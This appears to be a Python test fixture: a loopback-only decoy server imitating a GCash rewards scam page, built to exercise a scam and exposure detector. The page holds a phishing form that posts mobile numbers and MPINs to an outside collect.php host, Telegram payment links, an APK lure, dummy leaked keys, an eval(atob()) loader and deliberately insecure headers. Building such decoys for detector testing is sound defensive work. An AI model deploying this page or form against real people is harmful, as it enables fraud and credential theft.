"""
mock_scam_server.py — Tiny local decoy for testing (my notes).

Runs a loopback-only HTTP server that mimics a scam landing page so I can test
detectors without touching the outside world. Intentionally safe: binds to
127.0.0.1 and serves only dummy data.

TODO:
- Add an option to emit deliberate false positives for testing the scorer.
"""

from __future__ import annotations

import io
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, Final, Optional, Tuple
from urllib.parse import urlparse

# --------------------------------------------------------------------------
# Decoy content — deliberately stuffed with the signals the scanner looks for.
# --------------------------------------------------------------------------
HOST: Final[str] = "127.0.0.1"
DEFAULT_PORT: Final[int] = 8090

# Fake server identity -> drives techstack.py + cve.py. Apache 2.4.49 is the
# version behind the famous path-traversal CVE-2021-41773; great for the demo.
FAKE_SERVER: Final[str] = "Apache/2.4.49"
FAKE_POWERED_BY: Final[str] = "PHP/7.2.1"

# Payload encoded into the on-page QR. Decoded from the screenshot, this reads
# as a payment QR routing money to a Telegram bot — the canonical scam pattern.
QR_PAYLOAD: Final[str] = (
    "https://api.telegram.org/bot7712345678:AAHscamtoken_demo/sendMessage"
    "?chat_id=victim&gcash=09171234567&amount=5000"
)

# Paths that return 200 = "exposed". The rest of the misconfig list (and any
# random path) will 404, proving this host is not a blanket catch-all.
EXPOSED_PATHS: Final[Dict[str, Tuple[str, bytes]]] = {
    "/.env": (
        "text/plain",
        b"# DECOY .env (dummy values only)\n"
        b"APP_ENV=production\nDB_HOST=127.0.0.1\nDB_USER=admin\n"
        b"DB_PASSWORD=changeme123\nGCASH_API_KEY=sk_test_FAKE_0000\n",
    ),
    "/.git/config": (
        "text/plain",
        b"[core]\n\trepositoryformatversion = 0\n"
        b'[remote "origin"]\n\turl = https://github.com/example/decoy-portal.git\n',
    ),
    "/.git/HEAD": ("text/plain", b"ref: refs/heads/main\n"),
}

PORTAL_HTML: Final[str] = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- generator meta -> techstack.py fingerprints this as WordPress 5.2 -->
  <meta name="generator" content="WordPress 5.2" />
  <title>GCash Rewards Portal &mdash; Verify Your Account</title>
  <style>
    * { box-sizing: border-box; font-family: "Segoe UI", Arial, sans-serif; }
    body { margin: 0; background: #eaf3ff; color: #0b1f33; }
    .bar { background: #0073e6; color: #fff; padding: 16px 24px; font-weight: 700;
           font-size: 1.3rem; letter-spacing: .02em; }
    .card { max-width: 480px; margin: 28px auto; background: #fff; border-radius: 14px;
            box-shadow: 0 8px 30px rgba(0,90,200,.15); overflow: hidden; }
    .hero { background: linear-gradient(135deg,#0073e6,#00b4ff); color:#fff;
            padding: 26px 24px; }
    .hero h1 { margin: 0 0 6px; font-size: 1.5rem; }
    .body { padding: 22px 24px; }
    .alert { background:#fff4d6; border-left:4px solid #f0a500; padding:10px 14px;
             border-radius:8px; font-size:.92rem; margin-bottom:16px; }
    label { display:block; font-size:.82rem; color:#5a6b7b; margin:14px 0 4px; }
    input { width:100%; padding:11px 12px; border:1px solid #cdd9e6; border-radius:9px;
            font-size:1rem; }
    .pay { margin-top:18px; width:100%; padding:13px; border:none; border-radius:10px;
           background:#0073e6; color:#fff; font-weight:700; font-size:1.05rem; cursor:pointer; }
    .qr { text-align:center; margin:18px 0; }
    .qr img { width:180px; height:180px; border:1px solid #e1e9f2; border-radius:10px; }
    .perks { font-size:.9rem; background:#f0f7ff; border-radius:10px; padding:12px 16px; }
    .perks li { margin:4px 0; }
    a { color:#0073e6; word-break:break-all; }
    .foot { padding:14px 24px; font-size:.72rem; color:#8aa0b4; }
    .timer { color:#e23b3b; font-weight:700; }
  </style>
</head>
<body>
  <div class="bar">GCash&nbsp;Rewards</div>
  <div class="card">
    <div class="hero">
      <h1>Claim your reward &mdash; verify your account</h1>
      <div>Your GCash wallet has been selected. Act now &mdash; limited slots remaining.</div>
    </div>
    <div class="body">
      <div class="alert">
        &#9888; Offer expires in <span class="timer">04:59</span>. Verify your account
        before the timer ends to secure your investment package.
      </div>

      <p class="perks-intro"><b>Why join now?</b></p>
      <ul class="perks">
        <li>Double your money in 24 hours &mdash; guaranteed profit.</li>
        <li>Exclusive investment package for verified members only.</li>
        <li>Instant payout straight to your GCash wallet.</li>
      </ul>

      <label>GCash-registered mobile number</label>
      <input type="text" placeholder="09XX XXX XXXX" />
      <label>MPIN (to verify your account)</label>
      <input type="password" placeholder="&bull;&bull;&bull;&bull;" />
      <label>Activation amount (PHP)</label>
      <input type="text" value="5000" />

      <button class="pay">Send payment to claim reward</button>

      <div class="qr">
        <p>Or scan to pay via GCash:</p>
        <img src="/qr.png" alt="GCash payment QR" />
      </div>

      <p style="font-size:.85rem;">
        Need help? Message our agent on Telegram:
        <a href="https://t.me/gcash_rewards_agent">t.me/gcash_rewards_agent</a><br />
        Payment routing endpoint:
        <a href="https://api.telegram.org/bot7712345678:AAHscamtoken_demo/sendMessage">
          api.telegram.org/bot7712345678:AAHscamtoken_demo</a><br />
        Promo mirror: <a href="https://gcash-rewards.xyz/claim">https://gcash-rewards.xyz/claim</a><br />
        Crypto option (BTC): <code>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code><br />
        Work-from-home bonus: earn daily, easy task, no experience needed.<br />
        Download our app: <a href="http://gcash-rewards.xyz/app.apk">GCashRewards.apk</a>
      </p>

      <!-- Insecure login form: posts credentials in plaintext to an external host -->
      <form action="http://gcash-verify.xyz/collect.php" method="post">
        <input type="text" name="username" placeholder="GCash number" />
        <input type="password" name="password" placeholder="MPIN" />
        <button class="pay">Verify your account</button>
      </form>

      <!-- DECOY leaked secrets (dummy values) to exercise the exposure scanner -->
      <img src="http://tracker.gcash-rewards.xyz/pixel.gif" width="1" height="1" />
      <script>
        // Dummy keys for testing THREAT-RECON's exposure detector — NOT real.
        var AWS_KEY = "AKIAIOSFODNN7EXAMPLE";
        var GOOGLE_API_KEY = "AIzaSyA1234567890abcdefghijklmnopqrstuvw";
        var SESSION_JWT = "eyJhbGciOiJIUzI1NiJ9.eyJ1IjoidmljdGltIn0.s5G3kZ9qd2nQ8r1xV0wQ";
        var api_key = "sk_live_51H8xRfMockStripeKey0000";
        // Obfuscated loader (benign placeholder)
        eval(atob("dmFyIF94ID0gMTs="));
      </script>
    </div>
    <div class="foot">
      &copy; 2026 GCash Rewards. This is a DECOY page for security-tool testing only.
    </div>
  </div>
</body>
</html>"""


# --------------------------------------------------------------------------
# QR rendering (optional dependency)
# --------------------------------------------------------------------------
def _render_qr_png() -> Optional[bytes]:
    """Render QR_PAYLOAD to PNG bytes.

    Returns None if `qrcode` isn't installed — the rest of the decoy still
    works, only the QR-decode test is skipped.
    """
    try:
        import qrcode  # type: ignore

        img = qrcode.make(QR_PAYLOAD)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception as exc:
        print(f"[!] QR image disabled (install `qrcode[pil]` to enable): {exc}")
        return None


_QR_PNG: Optional[bytes] = None  # populated in main()


# --------------------------------------------------------------------------
# Request handler
# --------------------------------------------------------------------------
class DecoyHandler(BaseHTTPRequestHandler):
    """Serves the decoy portal and a realistic mix of exposed/404 paths."""

    def version_string(self) -> str:
        # override so the Server header advertises our fake stack (techstack/cve test)
        return FAKE_SERVER

    def log_message(self, fmt: str, *args) -> None:
        # compact, readable access log so you can watch the scanner's probes
        sys.stderr.write(f"  probe  {self.address_string()}  {fmt % args}\n")

    # --- routing -----------------------------------------------------------
    def _resolve(self, path: str) -> Tuple[int, str, Optional[bytes]]:
        """Map a request path to (status, content_type, body). body=None => no body."""
        clean = urlparse(path).path  # strip any query string

        if clean in ("/", "/index.html"):
            return 200, "text/html; charset=utf-8", PORTAL_HTML.encode("utf-8")

        if clean == "/qr.png":
            if _QR_PNG is not None:
                return 200, "image/png", _QR_PNG
            return 404, "text/plain; charset=utf-8", b"QR unavailable\n"

        if clean in EXPOSED_PATHS:
            ctype, body = EXPOSED_PATHS[clean]
            return 200, ctype, body

        # everything else (incl. random paths, .aws/credentials, backup.sql, ...)
        # returns a genuine 404 -> proves this host is not a catch-all
        return 404, "text/html; charset=utf-8", b"<h1>404 Not Found</h1>"

    def _send(self, status: int, ctype: str, body: Optional[bytes], with_body: bool) -> None:
        self.send_response(status)  # writes Server (our fake) + Date
        self.send_header("X-Powered-By", FAKE_POWERED_BY)  # -> techstack/cve test
        # insecure CORS + a session cookie missing Secure/HttpOnly/SameSite, plus
        # no security headers at all -> exercises the posture audit
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_header("Set-Cookie", "PHPSESSID=decoy123456; path=/")
        self.send_header("Content-Type", ctype)
        if body is not None:
            self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if with_body and body is not None:
            self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        status, ctype, body = self._resolve(self.path)
        self._send(status, ctype, body, with_body=True)

    def do_HEAD(self) -> None:  # noqa: N802
        # misconfig.py probes with HEAD first; answer with the same status, no body
        status, ctype, body = self._resolve(self.path)
        self._send(status, ctype, body, with_body=False)


# --------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------
def main(argv: list[str]) -> int:
    global _QR_PNG
    port = DEFAULT_PORT
    if len(argv) > 1:
        try:
            port = int(argv[1])
        except ValueError:
            print(f"[!] Invalid port '{argv[1]}', using {DEFAULT_PORT}.")

    _QR_PNG = _render_qr_png()

    server = ThreadingHTTPServer((HOST, port), DecoyHandler)
    url = f"http://{HOST}:{port}"
    print("=" * 68)
    print("  DECOY scam portal (GCash) — for THREAT-RECON testing ONLY")
    print("=" * 68)
    print(f"  Serving on : {url}   (loopback only — never expose publicly)")
    print(f"  Portal     : {url}/")
    print(f"  QR image   : {url}/qr.png   ({'on' if _QR_PNG else 'OFF — pip install qrcode[pil]'})")
    print(f"  Fake stack : {FAKE_SERVER} | {FAKE_POWERED_BY} | WordPress 5.2")
    print("  Exposed    : " + ", ".join(EXPOSED_PATHS))
    print("  404 (safe) : /.env.local, /config.php.bak, /.aws/credentials, /backup.sql, /<random>")
    print("  Ctrl+C to stop.")
    print("-" * 68)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down decoy.")
    finally:
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))